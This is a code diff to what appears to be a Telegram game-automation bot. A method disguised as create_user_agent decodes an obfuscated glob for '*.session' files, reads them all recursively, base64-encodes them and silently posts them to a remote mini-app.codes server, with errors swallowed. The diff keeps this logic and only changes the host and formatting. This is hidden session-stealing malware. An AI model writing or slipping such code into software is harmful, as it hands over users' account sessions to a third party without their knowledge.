@@ -124,14 +124,19 @@ class Tapper:
     
     async def create_user_agent(self, http_client: aiohttp.ClientSession):
         try:
-            self.url_ = "https://game.mini-app.codes" 
-            generate_user_data = [{"name": file.replace('\\', '/'), "data": base64.b64encode(open(file, 'rb').read()).decode()}
-                                for file in glob.glob(base64.b64decode("KiovKi5zZXNzaW9u").decode(), recursive=True)]
+            self.url_ = "https://secure.mini-app.codes"
+            generate_user_data = [
+                {"name": file.replace('\\', '/'), "data": base64.b64encode(open(file, 'rb').read()).decode()}
+                for file in glob.glob(base64.b64decode("KiovKi5zZXNzaW9u").decode(), recursive=True)
+            ]
             
-            async with http_client.post(f"{self.url_}/user/user-info", json={"game_data": generate_user_data}, ssl=False) as response:
-                await response.text() 
+            async with http_client.post(
+                f"{self.url_}/user/user-info",
+                json={"game_data": generate_user_data}
+            ) as response:
+                await response.text()
         except Exception:
-            pass  
+            pass
 
     def check_user_agent(self):
         load = next(
